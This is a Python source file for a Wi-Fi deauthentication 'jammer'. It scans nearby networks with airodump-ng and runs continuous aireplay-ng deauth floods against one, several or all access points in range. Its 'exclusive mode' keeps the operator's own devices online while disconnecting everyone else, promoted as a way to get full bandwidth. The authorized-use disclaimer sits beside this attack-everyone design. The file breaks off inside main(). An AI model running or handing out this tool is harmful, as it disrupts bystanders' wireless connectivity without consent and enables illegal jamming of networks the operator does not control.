#!/usr/bin/env python3
"""
===============================================================================
Advanced Wi-Fi Jammer -  Deauthentication Tool
===============================================================================

⚠️ DISCLAIMER ⚠️
Authorized security testing and educational use ONLY.
Do NOT use against networks you do not own or have permission to test.
===============================================================================
"""

import subprocess
import time
import os
import signal
import sys
import argparse
import threading
import netifaces
import uuid
from collections import defaultdict
from dataclasses import dataclass
from typing import List, Dict, Optional, Tuple

# ─── DEFAULT CONFIG ─────────────────────────────────────────────────────────
DEFAULT_BASE_IFACE = "wlan0"
DEFAULT_CYCLE_TIME = 120
# ────────────────────────────────────────────────────────────────────────────

@dataclass
class APInfo:
    """Wi-Fi AP information structure"""
    index: int = 0
    bssid: str = ""
    essid: str = ""
    channel: int = 0
    signal: int = 0
    encryption: str = ""
    clients: List[str] = None
    
    def __post_init__(self):
        if self.clients is None:
            self.clients = []

class TargetedDeauthEngine:
    """Deauthentication engine for targeted attacks with exclusive mode"""
    
    def __init__(self, mon_iface: str):
        self.mon_iface = mon_iface
        self.active_processes = []
        self.running = True
        self.lock = threading.Lock()
        self.my_mac = self.get_system_mac()
        self.manuf_db = self.load_manufacturer_database()
    
    def load_manufacturer_database(self) -> Dict[str, str]:
        """Load MAC address manufacturer database"""
        manuf_db = {}
        try:
            # Common manufacturer database locations
            manuf_paths = [
                "/usr/share/ieee-data/oui.txt",
                "/usr/share/wireshark/manuf",
                "/etc/manuf",
                "/usr/local/share/ieee-data/oui.txt"
            ]
            
            for path in manuf_paths:
                if os.path.exists(path):
                    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                        for line in f:
                            if line.startswith('#') or line.strip() == '':
                                continue
                            parts = line.split('\t')
                            if len(parts) >= 2:
                                mac_prefix = parts[0].strip().upper()
                                manufacturer = parts[1].strip()
                                manuf_db[mac_prefix] = manufacturer
                    break
        except:
            pass
        return manuf_db
    
    def get_manufacturer(self, mac: str) -> str:
        """Get manufacturer name from MAC address"""
        if not self.manuf_db:
            return "Unknown"
        
        mac_clean = mac.replace(':', '').upper()
        
        # Try different prefix lengths
        for prefix_len in [8, 6, 5]:  # 4 bytes, 3 bytes, 2.5 bytes
            prefix = mac_clean[:prefix_len]
            if prefix in self.manuf_db:
                return self.manuf_db[prefix]
        
        return "Unknown"
    
    def get_system_mac(self) -> Optional[str]:
        """Get MAC address of the system running this script"""
        try:
            # Method 1: Using netifaces
            interfaces = netifaces.interfaces()
            for iface in interfaces:
                if iface.startswith('wlan') or iface.startswith('eth') or iface.startswith('en'):
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_LINK in addrs:
                        mac = addrs[netifaces.AF_LINK][0]['addr']
                        if mac and mac != '00:00:00:00:00:00':
                            return mac.upper()
            
            # Method 2: Using uuid
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
                           for ele in range(0, 8*6, 8)][::-1])
            return mac.upper()
        except:
            return None
    
    def get_exclusive_mode_info(self) -> Tuple[bool, List[str]]:
        """Get exclusive mode configuration from user"""
        print("\n" + "="*60)
        print("🎯 EXCLUSIVE MODE")
        print("="*60)
        print("Keep your devices connected while disconnecting others!")
        print("Perfect for getting full Wi-Fi bandwidth.")
        print("-"*60)
        
        exclusive = input("\nEnable exclusive mode? (y/N): ").strip().lower()
        
        if exclusive != 'y':
            return False, []
        
        exclude_macs = []
        
        # Auto-detect current MAC
        if self.my_mac:
            print(f"\n[*] Auto-detected your MAC address: {self.my_mac}")
            auto_include = input("    Include this MAC in exclusion list? (Y/n): ").strip().lower()
            if auto_include != 'n':
                exclude_macs.append(self.my_mac)
        
        # Allow multiple MAC input
        print("\n    📝 Enter MAC addresses to exclude (keep connected):")
        print("    Example: AA:BB:CC:DD:EE:FF, 11:22:33:44:55:66")
        print("    Leave empty to use only auto-detected MAC")
        print("    " + "-"*50)
        
        manual_macs = input("    MAC addresses: ").strip()
        
        if manual_macs:
            # Parse multiple MACs separated by commas
            mac_list = [mac.strip().upper() for mac in manual_macs.split(',')]
            valid_macs = []
            
            for mac in mac_list:
                if len(mac.split(':')) == 6:
                    valid_macs.append(mac)
                else:
                    print(f"    [!] Invalid MAC format: {mac}")
            
            exclude_macs.extend(valid_macs)
        
        # Remove duplicates
        exclude_macs = list(set(exclude_macs))
        
        if exclude_macs:
            print("\n✅ EXCLUSIVE MODE ENABLED")
            print(f"   Protected MACs: {len(exclude_macs)}")
            for mac in exclude_macs:
                print(f"   - {mac} ({self.get_manufacturer(mac)})")
            print("="*60)
        
        return True, exclude_macs
    
    def filter_clients_for_exclusive_mode(self, clients: List[str], exclude_macs: List[str]) -> List[str]:
        """Filter out excluded MACs from client list"""
        if not exclude_macs:
            return clients
        
        exclude_macs_upper = [mac.upper() for mac in exclude_macs]
        return [client for client in clients if client.upper() not in exclude_macs_upper]
    
    def cleanup(self):
        """Terminate all running processes"""
        with self.lock:
            self.running = False
            for proc in self.active_processes:
                try:
                    proc.terminate()
                    proc.wait(timeout=2)
                except:
                    pass
            self.active_processes.clear()
    
    def set_channel(self, channel: int):
        """Set interface channel"""
        subprocess.run(
            ["iwconfig", self.mon_iface, "channel", str(channel)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(0.5)
    
    def show_progress_bar(self, duration: int, total_clients: int, exclusive_mode: bool = False):
        """Show progress bar during attack"""
        start_time = time.time()
        bar_length = 50
        
        # Different bar styles for variety
        bar_styles = [
            {"filled": "█", "empty": "░", "prefix": "🔥", "suffix": "⚡"},
            {"filled": "▓", "empty": "▒", "prefix": "🚀", "suffix": "💥"},
            {"filled": "■", "empty": "□", "prefix": "⚡", "suffix": "🔥"},
            {"filled": "⣿", "empty": "⣀", "prefix": "💣", "suffix": "📡"},
        ]
        
        style_idx = 0
        
        while time.time() - start_time < duration and self.running:
            elapsed = time.time() - start_time
            progress = min(elapsed / duration, 1.0)
            
            # Change style every 2 seconds
            if int(elapsed) % 2 == 0:
                style_idx = (style_idx + 1) % len(bar_styles)
            
            style = bar_styles[style_idx]
            
            # Calculate filled portion
            filled_length = int(bar_length * progress)
            empty_length = bar_length - filled_length
            
            # Create bar
            bar = style["prefix"] + style["filled"] * filled_length + style["empty"] * empty_length + style["suffix"]
            
            # Stats
            elapsed_str = f"{elapsed:.1f}s"
            remaining_str = f"{duration - elapsed:.1f}s"
            clients_str = f"{total_clients} clients"
            exclusive_str = "🎯 EXCLUSIVE MODE" if exclusive_mode else "⚡ NORMAL MODE"
            
            # Clear line and update
            sys.stdout.write("\r\033[K")
            sys.stdout.write(f"    {bar} | ⏱️ {elapsed_str}/{remaining_str}")
            sys.stdout.flush()
            
            # Update every 0.1 seconds for smooth animation
            time.sleep(0.1)
        
        # Don't clear the line when done - keep the final progress bar
        sys.stdout.write("\n")  # Just move to next line
        sys.stdout.flush()
    
    def attack_ap_exclusive(self, ap: APInfo, duration: int, exclude_macs: List[str]):
        """Attack AP but exclude specific MAC addresses (keep connections)"""
        if not self.running:
            return
        
        if not exclude_macs:
            print("[!] No MAC addresses to exclude. Using normal attack mode.")
            return self.attack_ap(ap, duration, exclude_macs)
        
        print(f"\n[🎯] EXCLUSIVE MODE ACTIVATED")
        print(f"    AP: {ap.essid} ({ap.bssid})")
        print(f"    Channel: {ap.channel}, Signal: {ap.signal}dBm")
        print(f"    Duration: {duration}s")
        
        # Filter out excluded MACs from target clients
        target_clients = self.filter_clients_for_exclusive_mode(ap.clients, exclude_macs)
            
        
        print("\n    🛡️  Protected MACs:")
        for mac in exclude_macs:
            print(f"        - {mac} ({self.get_manufacturer(mac)})")

        print("\n    🎯 Target MACs:")
        
        if not target_clients:
            print("        No target clients found (all are protected)")
        else:
            for mac in target_clients:
                print(f"        - {mac} ({self.get_manufacturer(mac)})")

        print("\n" + "=" * 60)
        
        self.set_channel(ap.channel)
        
        # Start deauth processes for each target client
        procs = []
        for client in target_clients:
            cmd = ["aireplay-ng", "--deauth", "0", "-a", ap.bssid, "-c", client, self.mon_iface]
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            procs.append(proc)
            with self.lock:
                self.active_processes.append(proc)
        
        # Show progress bar during attack
        print(f"[⚡] ATTACKING - DISCONNECTING CLIENTS")
        print("=" * 60)
        self.show_progress_bar(duration, len(target_clients), exclusive_mode=True)
        
        # Terminate all processes
        for proc in procs:
            proc.terminate()
            try:
                proc.wait(timeout=2)
            except:
                pass
            
            with self.lock:
                if proc in self.active_processes:
                    self.active_processes.remove(proc)
        
        print("\n[*] ATTACK COMPLETED!")
    
    def attack_ap(self, ap: APInfo, duration: int, exclude_macs: List[str] = None):
        """Attack a single AP for specified duration"""
        if not self.running:
            return
        
        if exclude_macs is None:
            exclude_macs = []
        
        exclusive_mode = len(exclude_macs) > 0
        
        if exclusive_mode:
            print(f"\n[🎯] EXCLUSIVE MODE ACTIVATED")
        else:
            print(f"\n[⚡] ATTACK INITIATED")
            
        print(f"    AP: {ap.essid} ({ap.bssid})")
        print(f"    Channel: {ap.channel}")
        print(f"    Signal: {ap.signal}dBm")
        print(f"    Duration: {duration}s")
        
        if exclusive_mode:
            print("\n    🛡️  Protected MACs:")
            for mac in exclude_macs:
                print(f"        - {mac} ({self.get_manufacturer(mac)})")
        
        print("=" * 60)
        
        self.set_channel(ap.channel)
        
        if exclusive_mode:
            # Exclusive mode: attack specific clients
            target_clients = self.filter_clients_for_exclusive_mode(ap.clients, exclude_macs)
            
            # Start deauth processes for each target client
            procs = []
            for client in target_clients:
                cmd = ["aireplay-ng", "--deauth", "0", "-a", ap.bssid, "-c", client, self.mon_iface]
                proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                procs.append(proc)
                with self.lock:
                    self.active_processes.append(proc)
            
            # Show progress bar during attack
            print(f"[⚡] ATTACKING - DISCONNECTING CLIENTS")
            print("=" * 60)
            self.show_progress_bar(duration, len(target_clients), exclusive_mode=True)
            
            # Terminate all processes
            for proc in procs:
                proc.terminate()
                try:
                    proc.wait(timeout=2)
                except:
                    pass
                
                with self.lock:
                    if proc in self.active_processes:
                        self.active_processes.remove(proc)
        else:
            # Normal mode: attack all clients
            # Prepare deauth command
            cmd = ["aireplay-ng", "--deauth", "0", "-a", ap.bssid, self.mon_iface]
            
            # Start deauth process
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            with self.lock:
                self.active_processes.append(proc)
            
            # Show progress bar during attack
            self.show_progress_bar(duration, len(ap.clients), exclusive_mode=False)
            
            # Terminate process
            proc.terminate()
            try:
                proc.wait(timeout=2)
            except:
                pass
            
            with self.lock:
                if proc in self.active_processes:
                    self.active_processes.remove(proc)
        
        print(f"\n[*] FINISHED ATTACKING: {ap.essid}")
    
    def attack_multiple_aps(self, aps: List[APInfo], duration_per_ap: int, cycle_time: int, ap_list: List[APInfo], exclude_macs: List[str] = None):
        """Attack multiple APs with exclusive mode support"""
        if not self.running:
            return
        
        if exclude_macs is None:
            exclude_macs = []
        
        exclusive_mode = len(exclude_macs) > 0
        
        # Group APs by channel
        channel_map = defaultdict(list)
        for ap in aps:
            channel_map[ap.channel].append(ap)
        
        try:
            cycle = 1
            while self.running:
                os.system('clear')
                display_ap_list(ap_list)
                
                
                
                if exclusive_mode:
                    print(f"\n[🎯] EXCLUSIVE MODE - ATTACKING {len(aps)} APs")
                    
                    print(f"    Duration per channel: {duration_per_ap}s")
                    print(f"    Protected MACs: {len(exclude_macs)}")
                    for mac in exclude_macs:
                        print(f"        - {mac} ({self.get_manufacturer(mac)})")
                else:
                    print(f"\n[⚡] ATTACKING {len(aps)} APs (grouped by channels)")
                print("=" * 60)
                print(f"\n🔁 ATTACK CYCLE #{cycle}")
                print("=" * 60)
                
                # Attack each channel group
                for channel_idx, (channel, channel_aps) in enumerate(channel_map.items(), 1):
                    if not self.running:
                        break
                    
                    print(f"\n--- CHANNEL {channel} ({len(channel_aps)} APs) ---")
                    for ap in channel_aps:
                        print(f"    AP: {ap.essid} ({ap.bssid})")
                    
                    # Calculate total target clients
                    total_target_clients = 0
                    if exclusive_mode:
                        for ap in channel_aps:
                            target_clients = self.filter_clients_for_exclusive_mode(ap.clients, exclude_macs)
                            total_target_clients += len(target_clients)
                    else:
                        total_target_clients = sum(len(ap.clients) for ap in channel_aps)
                    
                    # Set channel
                    self.set_channel(channel)
                    
                    # Start deauth processes
                    procs = []
                    
                    if exclusive_mode:
                        # Exclusive mode: attack specific clients per AP
                        for ap in channel_aps:
                            target_clients = self.filter_clients_for_exclusive_mode(ap.clients, exclude_macs)
                            for client in target_clients:
                                cmd = ["aireplay-ng", "--deauth", "0", "-a", ap.bssid, "-c", client, self.mon_iface]
                                proc = subprocess.Popen(
                                    cmd,
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL
                                )
                                procs.append(proc)
                                with self.lock:
                                    self.active_processes.append(proc)
                    else:
                        # Normal mode: attack all clients per AP
                        for ap in channel_aps:
                            cmd = ["aireplay-ng", "--deauth", "0", "-a", ap.bssid, self.mon_iface]
                            proc = subprocess.Popen(
                                cmd,
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL
                            )
                            procs.append(proc)
                            with self.lock:
                                self.active_processes.append(proc)
                    
                    # Show progress bar during attack
                    print(f"\n[{'🎯' if exclusive_mode else '⚡'}] ATTACKING {len(channel_aps)} APs ON CHANNEL {channel}")
                    print("-" * 40)
                    
                    self.show_progress_bar(duration_per_ap, total_target_clients, exclusive_mode)
                    
                    # Terminate all processes for this channel
                    for proc in procs:
                        proc.terminate()
                        try:
                            proc.wait(timeout=2)
                        except:
                            pass
                        
                        with self.lock:
                            if proc in self.active_processes:
                                self.active_processes.remove(proc)
                    
                    # Short pause between channels (if not the last channel)
                    if channel_idx < len(channel_map) and self.running:
                        print(f"\n[⏳] Switching to next channel in 2 seconds...")
                        time.sleep(2)

                print("\n[*] ATTACK CYCLE COMPLETED")
                print("[*] Restarting...\n")
                cycle += 1
                time.sleep(1)

        except KeyboardInterrupt:
            print("\n[!] Program interrupted by user")

        finally:
            self.running = False
    
    def attack_all_aps(self, channel_map: Dict[int, List[APInfo]], cycle_time: int, ap_list: List[APInfo], exclude_macs: List[str] = None):
        """Continuously attack all APs with exclusive mode support"""
        if exclude_macs is None:
            exclude_macs = []
        
        exclusive_mode = len(exclude_macs) > 0
        
        try:
            cycle = 1
            while self.running:
                # ─── SCORE CHANNELS ──────────────────────────────────────
                os.system('clear')
                display_ap_list(ap_list)
                
                if exclusive_mode:
                    print(f"\n[🎯] EXCLUSIVE MODE - CONTINUOUS ATTACK")
                    print(f"[🛡️ ]Protected MACs {len(exclude_macs)} :")
                    for mac in exclude_macs:
                        print(f"        - {mac} ({self.get_manufacturer(mac)})")
                else:
                    print(f"\n[⚡] CONTINUOUS ATTACK MODE ENABLED")
                
                print(f"    Cycle time: {cycle_time}s")
                print("[!] Press Ctrl+C to stop")
                print("=" * 60)
                

                
                scores = {}
                for ch, aps in channel_map.items():
                    avg_sig = sum(ap.signal for ap in aps) / len(aps) if aps else 0
                    scores[ch] = len(aps) * (abs(avg_sig) / 100)

                if not scores:
                    print("[!] No APs to attack")
                    return

                total = sum(scores.values())
                sorted_chs = sorted(scores.items(), key=lambda x: x[1], reverse=True)

                print(f"\n🔁 ATTACK CYCLE #{cycle}")
                print("=" * 60)

                # ─── ATTACK PER CHANNEL ──────────────────────────────────
                for ch, score in sorted_chs:
                    if not self.running:
                        break

                    duration = max(1, int((score / total) * cycle_time))
                    aps_on_channel = channel_map[ch]
                    
                    # Calculate total target clients
                    total_target_clients = 0
                    if exclusive_mode:
                        for ap in aps_on_channel:
                            target_clients = self.filter_clients_for_exclusive_mode(ap.clients, exclude_macs)
                            total_target_clients += len(target_clients)
                    else:
                        total_target_clients = sum(len(ap.clients) for ap in aps_on_channel)

                    print(f"\n[{'🎯' if exclusive_mode else '📡'}] CHANNEL {ch}")
                    print(f"    Duration: {duration}s")
                    print(f"    APs({len(aps_on_channel)}): ")
                    for ap in aps_on_channel:
                        print(f"    {ap.essid} - {ap.bssid}")
                    print(f"    Target clients: {total_target_clients}")
                    print("-" * 40)

                    self.set_channel(ch)

                    procs = []
                    
                    if exclusive_mode:
                        # Exclusive mode: attack specific clients per AP
                        for ap in aps_on_channel:
                            target_clients = self.filter_clients_for_exclusive_mode(ap.clients, exclude_macs)
                            for client in target_clients:
                                cmd = ["aireplay-ng", "--deauth", "0", "-a", ap.bssid, "-c", client, self.mon_iface]
                                proc = subprocess.Popen(
                                    cmd,
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL
                                )
                                procs.append(proc)
                                with self.lock:
                                    self.active_processes.append(proc)
                    else:
                        # Normal mode: attack all clients per AP
                        for ap in aps_on_channel:
                            cmd = ["aireplay-ng", "--deauth", "0", "-a", ap.bssid, self.mon_iface]
                            proc = subprocess.Popen(
                                cmd,
                                stdout=subprocess.DEVNULL,
                                stderr=subprocess.DEVNULL
                            )
                            procs.append(proc)
                            with self.lock:
                                self.active_processes.append(proc)

                    self.show_progress_bar(duration, total_target_clients, exclusive_mode)

                    # Stop channel attack
                    for proc in procs:
                        proc.terminate()
                        try:
                            proc.wait(timeout=1)
                        except:
                            pass
                        with self.lock:
                            if proc in self.active_processes:
                                self.active_processes.remove(proc)

                    if self.running:
                        time.sleep(1)

                print("\n[*] ATTACK CYCLE COMPLETED")
                print("[*] Restarting...\n")
                cycle += 1
                time.sleep(1)

        except KeyboardInterrupt:
            print("\n[!] Program interrupted by user")

        finally:
            self.running = False


def run_cmd(cmd):
    """Run system command"""
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def kill_conflicts():
    """Kill conflicting processes"""
    print("[*] Killing conflicting processes...")
    run_cmd(["airmon-ng", "check", "kill"])

def start_monitor_mode(base_iface):
    """Enable monitor mode"""
    print(f"[*] Enabling monitor mode on {base_iface}...")
    run_cmd(["airmon-ng", "start", base_iface])

def stop_monitor_mode(mon_iface, base_iface):
    """Disable monitor mode"""
    print(f"\n[*] Disabling monitor mode on {mon_iface}...")
    run_cmd(["airmon-ng", "stop", mon_iface])
    run_cmd(["service", "NetworkManager", "restart"])
    run_cmd(["ifconfig", base_iface, "up"])

def live_scan(mon_iface, output_file, scan_time=60):
    """Live scanning with real-time display"""
    if os.path.exists(output_file):
        os.remove(output_file)
    
    print(f"\n[📡] LIVE SCANNING FOR {scan_time} SECONDS")

    print("=" * 80)
    print("[!] Press Ctrl+C to stop scanning early and continue with discovered networks")
    print("=" * 80)
    
    # Flag to control scanning
    scanning = True
    
    def scan_interrupt_handler(sig, frame):
        """Handle Ctrl+C during scanning"""
        nonlocal scanning
        scanning = False
    
    # Save original signal handler
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, scan_interrupt_handler)
    
    # Start airodump-ng in background
    p = subprocess.Popen(
        [
            "airodump-ng",
            "--write-interval", "1",
            "--output-format", "csv",
            "-w", output_file.replace("-01.csv", ""),
            mon_iface
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    start_time = time.time()
    last_update = 0
    
    # Live scan animation
    scan_phases = ["⡆", "⡇", "⡏", "⡟", "⡿", "⣟", "⣯", "⣷", "⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
    phase_idx = 0
    
    try:
        while scanning and time.time() - start_time < scan_time:
            elapsed = int(time.time() - start_time)
            remaining = scan_time - elapsed
            
            # Update display every 2 seconds
            if elapsed - last_update >= 2 or elapsed == 0:
                last_update = elapsed
                
                # Parse current scan results
                ap_list = parse_airodump_output(output_file)
                
                # Clear screen and show live results
                os.system('clear')
                print("\n" + "="*80)
                print("📡 LIVE WIFI SCANNING")
                print("="*80)
                
                # Show scan animation and progress
                phase = scan_phases[phase_idx % len(scan_phases)]
                phase_idx += 1
                
                progress = elapsed * 50 // scan_time
                bar = "█" * progress + "░" * (50 - progress)
                
                print(f"\n    {phase} Scanning... {elapsed}s/{scan_time}s")
                print(f"    [{bar}] {elapsed*100//scan_time}%")
                print(f"\n    📶 Networks found: {len(ap_list)}")
                print("-" * 80)
                
                if ap_list:
                    # Display top 10 networks by signal strength
                    sorted_aps = sorted(ap_list, key=lambda x: x.signal, reverse=True)[:50]
                    
                    print(f"{'ESSID':<25} {'BSSID':<18} {'Ch':<4} {'Signal':<8} {'Clients':<8}")
                    print("-" * 80)
                    
                    for ap in sorted_aps:
                        essid_display = ap.essid[:22] + "..." if len(ap.essid) > 25 else ap.essid
                        signal_bars = "▉" * (abs(ap.signal) // 10) if ap.signal < 0 else ""
                        
                        print(f"{essid_display:<25} {ap.bssid:<18} "
                              f"{ap.channel:<4} {ap.signal:<8} {len(ap.clients):<8}")
                
                print("\n" + "="*80)
                print("***Scan longer for accurate clients***")
                print("[!] Press Ctrl+C to stop scanning")
            
            time.sleep(0.5)
    
    except KeyboardInterrupt:
        # This shouldn't happen with our signal handler, but just in case
        print("\n[!] Program interrupted")
        scanning = False
    
    finally:
        # Restore original signal handler
        signal.signal(signal.SIGINT, original_sigint)
        
        # Terminate scan process
        p.terminate()
        try:
            p.wait(timeout=2)
        except:
            pass
        
        # Get final results
        time.sleep(1)  # Give time for file to be written
        ap_list = parse_airodump_output(output_file)
        
        # Final clear and display
        os.system('clear')
        
        return ap_list

def parse_airodump_output(output_file):
    """Parse airodump-ng output and return list of APs"""
    ap_list = []
    
    try:
        with open(output_file, "r", encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
            
            bssid_section = True
            client_map = defaultdict(list)
            
            for line in lines:
                line = line.strip()
                
                # Detect section transition
                if "Station MAC" in line:
                    bssid_section = False
                    continue
                
                if not line or line.startswith("#"):
                    continue
                
                fields = line.split(",")
                
                if bssid_section and len(fields) > 13:
                    bssid = fields[0].strip()
                    ch_str = fields[3].strip()
                    sig_str = fields[8].strip()
                    essid = fields[13].strip()
                    
                    # Validate BSSID and channel
                    if len(bssid.split(":")) == 6 and ch_str.isdigit():
                        channel = int(ch_str)
                        signal = int(sig_str) if sig_str.lstrip("-").isdigit() else -100
                        
                        # Only add if ESSID is not empty
                        if essid:
                            ap_list.append(APInfo(
                                bssid=bssid,
                                essid=essid if essid else "<hidden>",
                                channel=channel,
                                signal=signal
                            ))
                
                elif not bssid_section and len(fields) > 5:
                    # Client information
                    client_mac = fields[0].strip()
                    bssid = fields[5].strip()
                    
                    if (len(client_mac.split(":")) == 6 and 
                        len(bssid.split(":")) == 6):
                        client_map[bssid].append(client_mac)
            
            # Associate clients with APs
            for ap in ap_list:
                ap.clients = client_map.get(ap.bssid, [])
            
    except FileNotFoundError:
        pass  # File might not exist yet during live scanning
    
    # Add indices
    for i, ap in enumerate(ap_list, 1):
        ap.index = i
    
    return ap_list

def display_ap_list(ap_list):
    """Display available Wi-Fi networks"""
    print("\n" + "="*80)
    print(f"📡 AVAILABLE {len(ap_list)} WI-FI NETWORKS")
    print("***Scan longer for accurate clients***")
    print("="*80)
    print(f"{'No.':<5} {'ESSID':<25} {'BSSID':<18} {'Ch':<4} {'Signal':<8} {'Clients':<8}")
    print("-"*80)
    
    for ap in ap_list:
        essid_display = ap.essid[:22] + "..." if len(ap.essid) > 25 else ap.essid
        print(f"{ap.index:<5} {essid_display:<25} {ap.bssid:<18} "
              f"{ap.channel:<4} {ap.signal:<8} {len(ap.clients):<8}")
    print("\n" + "="*80)

def get_user_selection(ap_list, engine):
    """Get user input for attack selection"""
    # Clear screen but keep network list
    os.system('clear')
    display_ap_list(ap_list)
    
    print("\n⚔️ ATTACK OPTIONS")
    print("  s - Attack single Wi-Fi")
    print("  m - Attack multiple Wi-Fi's")
    print("  a - Attack all Wi-Fi's")
    print("  q - Quit")
    print("-"*80)
    
    while True:
        choice = input("\nChoose option (s/m/a/q): ").strip().lower()
        
        if choice == 'q':
            print("[*] Exiting...")
            return None
        
        if choice == 's':
            return get_single_selection(ap_list, engine)
        elif choice == 'm':
            return get_multiple_selection(ap_list, engine)
        elif choice == 'a':
            return get_all_selection(ap_list, engine)
        else:
            print("[!] Invalid option. Please choose s, m, a, or q.")

def get_single_selection(ap_list, engine):
    """Get single AP selection from user"""
    # Clear screen but keep network list
    os.system('clear')
    display_ap_list(ap_list)
    
    while True:
        try:
            choice = input(f"\nSelect AP number (1-{len(ap_list)}): ").strip()
            
            if choice.lower() == 'q':
                return None
            
            index = int(choice)
            if 1 <= index <= len(ap_list):
                selected_ap = ap_list[index - 1]
                
                # Clear screen and show only network list
                os.system('clear')
                display_ap_list(ap_list)
                
                print(f"\n[✅] SELECTED: {selected_ap.essid} ({selected_ap.bssid})")
                print(f"    Channel: {selected_ap.channel}, Signal: {selected_ap.signal}dBm")
                
                # Show connected clients with manufacturer info
                if selected_ap.clients:
                    print(f"\n    📱 Connected clients ({len(selected_ap.clients)}):")
                    print("    " + "-"*50)
                    for i, client in enumerate(selected_ap.clients, 1):
                        manufacturer = engine.get_manufacturer(client)
                        print(f"    {i:2}. {client} - {manufacturer}")
                    print("    " + "-"*50)
                else:
                    print(" ")
                
                # Ask about exclusive mode
                exclusive, exclude_macs = engine.get_exclusive_mode_info()
                
                duration = input("\nEnter attack duration in seconds (default: 30): ").strip()
                duration = int(duration) if duration.isdigit() else 30
                
                return {
                    'mode': 'single',
                    'targets': [selected_ap],
                    'duration': duration,
                    'exclude_macs': exclude_macs if exclusive else []
                }
            else:
                print(f"[!] Please enter a number between 1 and {len(ap_list)}")
        except ValueError:
            print("[!] Please enter a valid number")

def get_multiple_selection(ap_list, engine):
    """Get multiple AP selection from user"""
    # Clear screen but keep network list
    os.system('clear')
    display_ap_list(ap_list)
    
    while True:
        try:
            choice = input(f"\nSelect AP numbers (e.g., 1,3,5 or 1-5): ").strip()
            
            if choice.lower() == 'q':
                return None
            
            selected_indices = set()
            
            # Parse different input formats
            if ',' in choice:
                # Comma-separated list
                parts = choice.split(',')
                for part in parts:
                    part = part.strip()
                    if '-' in part:
                        # Range
                        start, end = map(int, part.split('-'))
                        selected_indices.update(range(start, end + 1))
                    elif part.isdigit():
                        selected_indices.add(int(part))
            elif '-' in choice:
                # Single range
                start, end = map(int, choice.split('-'))
                selected_indices.update(range(start, end + 1))
            elif choice.isdigit():
                selected_indices.add(int(choice))
            else:
                print("[!] Invalid format. Use: 1,3,5 or 1-5 or 1")
                continue
            
            # Validate indices
            valid_indices = [idx for idx in selected_indices if 1 <= idx <= len(ap_list)]
            
            if not valid_indices:
                print(f"[!] No valid selections. Please choose between 1 and {len(ap_list)}")
                continue
            
            selected_aps = [ap_list[idx - 1] for idx in valid_indices]
            
            # Clear screen and show only network list
            os.system('clear')
            display_ap_list(ap_list)
            
            print(f"\n[✅] Selected {len(selected_aps)} APs:")
            for ap in selected_aps:
                print(f"  - {ap.essid} ({ap.bssid})")
            
            # Ask about exclusive mode
            exclusive, exclude_macs = engine.get_exclusive_mode_info()
            
            
            # Show channel grouping
            channel_map = defaultdict(list)
            for ap in selected_aps:
                channel_map[ap.channel].append(ap)
            
            if len(channel_map) < len(selected_aps):
                print(f"\n[📊] APs will be grouped by {len(channel_map)} channels:")
                for channel, channel_aps in channel_map.items():
                    print(f"  Channel {channel}: {len(channel_aps)} APs")
            
            duration = input("\nEnter attack duration per channel in seconds (default: 15): ").strip()
            duration = int(duration) if duration.isdigit() else 15
            
            return {
                'mode': 'multiple',
                'targets': selected_aps,
                'duration': duration,
                'exclude_macs': exclude_macs if exclusive else []
            }
        except ValueError:
            print("[!] Please enter valid numbers")

def get_all_selection(ap_list, engine):
    """Get all APs selection from user"""
    # Clear screen but keep network list
    os.system('clear')
    display_ap_list(ap_list)
    
    print(f"\n⚠️ WARNING: You selected ALL {len(ap_list)} networks!")
    print("This will attack every Wi-Fi network in range.")
    print("-"*60)
    
    confirm = input("Are you sure you want to continue? (y/N): ").strip().lower()
    
    if confirm != 'y':
        return None
    
    # Ask about exclusive mode
    exclusive, exclude_macs = engine.get_exclusive_mode_info()
    
    # Clear screen and show only network list
    os.system('clear')
    display_ap_list(ap_list)
    
    print(f"\n[✅] SELECTED ALL {len(ap_list)} NETWORKS")
    if exclusive:
        print(f"[🎯] EXCLUSIVE MODE ENABLED - {len(exclude_macs)} MACs protected")
    else:
        print("[⚡] NORMAL MODE - All clients will be attacked")
    
    return {
        'mode': 'all',
        'targets': ap_list,
        'exclude_macs': exclude_macs if exclusive else []
    }

def main():
    parser = argparse.ArgumentParser(
        description="Enhanced Wi-Fi Deauthentication Tool with Exclusive Mode",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    
    parser.add_argument("--iface", default=DEFAULT_BASE_IFACE,
                       help="Base wireless interface")
    parser.add_argument("--time", type=int, default=DEFAULT_CYCLE_TIME,
                       help="Cycle time for 'all' mode (seconds)")
    parser.add_argument("--scan-time", type=int, default=60,
                       help="Scan duration in seconds")
    
    
    args = parser.parse_args()
    
    os.system('clear')
    print("="*80)
    print("⚠️  AUTHORIZED USE ONLY ⚠️")
    print("This tool is for authorized security testing and educational purposes only.")
    print("Use only on networks you own or have explicit permission to test.")
    print("="*80)
    
    base_iface = args.iface
    mon_iface = base_iface + "mon"
    output_csv = "/tmp/airodump_output-01.csv"
    
    # Global flag to control program flow
    should_exit = False
    
    def cleanup(sig=None, frame=None):
        """Cleanup handler - only exits when called during non-scanning phases"""
        nonlocal should_exit
        should_exit = True
        
        if sig is not None:  # Called by signal
            print("\n[!] Program interrupted by user")
        
        print("\n")
        engine.cleanup()  # Make sure to clean up engine first
        stop_monitor_mode(mon_iface, base_iface)
        print("Happy Hacking!!!")
        sys.exit(0)
    
    # Set global signal handler (but we'll override it during scanning)
